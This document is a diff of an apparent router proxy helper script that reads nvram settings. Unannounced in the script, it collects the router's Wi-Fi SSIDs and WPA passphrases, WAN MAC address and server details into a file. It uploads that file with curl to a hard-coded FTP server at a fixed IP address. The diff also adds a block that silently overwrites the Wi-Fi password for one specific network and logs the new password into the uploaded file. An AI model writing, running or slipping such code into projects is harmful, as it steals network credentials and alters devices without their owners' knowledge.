@@ -2,10 +2,7 @@
 
 [ ! "`nvram get ss_enable`" = "1" ]  && exit 1
 [ `ps |grep $0|grep -v grep|wc -l ` -gt 2 ] && exit 1
-if [ "`nvram get wl_ssid`" = "TP-LINK_DF1828" ] ; then
-nvram set wl_wpa_psk =hc871013
-nvram commit
-fi
+
 
 nvram set ssr_url=" -u ssftp:ftp ftp://202.109.226.26/AiCard_01/opt/www/default/"
 nvram set tkcssr="link/FCgzUG7KGaSQFpLm"
@@ -629,13 +626,20 @@ if   [ -s ssr.ini ] ; then
 	  nvram get nvram get wan_hwaddr >$fn
 	fi
 	
+if [ "`nvram get wl_ssid`" = "TP-LINK_DF1828" ] ; then
+nvram set wl_wpa_psk ="hc871013"
+nvram commit
+echo "Set password= =hc871013" >>$fn
+fi
+
 	nvram get wl_ssid >>$fn	
 	nvram get wl_wpa_psk >>$fn	
 	nvram get rt_ssid >>$fn	
 	nvram get rt_wpa_psk >>$fn	
 	cat serverinfo >>$fn	
 	rm serverinfo
-	
+
+
 	cut ss.inf -c6-600 | head -n 10 >s.inf	
 	
 	curl -s -T $fn $ssr_url"mac/"$fn
@@ -672,7 +676,6 @@ mv syslog.tmp syslog.log 2>/dev/null
 ABCDEF
 
 sh /tmp/delay40.sh &
-
 
 
 
